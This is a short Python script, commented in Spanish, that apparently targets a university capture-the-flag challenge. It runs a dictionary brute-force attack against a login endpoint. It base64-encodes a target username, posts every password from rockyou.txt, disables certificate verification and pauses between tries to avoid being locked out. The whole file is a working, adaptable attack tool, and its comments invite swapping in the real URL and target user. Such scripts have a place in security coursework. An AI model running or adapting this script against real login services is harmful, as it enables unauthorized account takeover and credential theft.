import base64
import json
import requests
import time
import urllib3

# Desactivar los warnings por certificados SSL no verificados
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración
url = 'https://gorila.dsa.linti.unlp.edu.ar/login'  # ⚠️ Cambiar por la URL real del reto
usuario_original = 'usuarioConClaveDebil'          # ⚠️ Cambiar por el nombre de usuario objetivo
diccionario_path = 'rockyou.txt'    # Ruta al diccionario

# Codificamos el usuario en base64 como en la página (btoa)
usuario_codificado = base64.b64encode(usuario_original.encode()).decode()

# Leer diccionario y probar contraseñas
with open(diccionario_path, 'r', encoding='latin-1') as f:
    for i, password in enumerate(f):
        password = password.strip()

        payload = {
            'username': usuario_codificado,
            'password': password
        }

        headers = {
            'Content-Type': 'application/json'
        }

        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload),
                verify=False  # Ignorar certificados inválidos
            )

            if response.status_code == 200:
                data = response.json()
                print(f"[+] ¡Éxito! Contraseña encontrada: {password}")
                print(f"Mensaje del servidor: {data.get('message')}")
                break
            else:
                error_detail = response.json().get('detail', 'Respuesta no esperada')
                print(f"[-] Falló[{i}]: {usuario_codificado} : {password} - {error_detail}")

        except Exception as e:
            print(f"[!] Error con contraseña {password}: {e}")

        # Pausa para evitar bloqueo
        time.sleep(0.1)

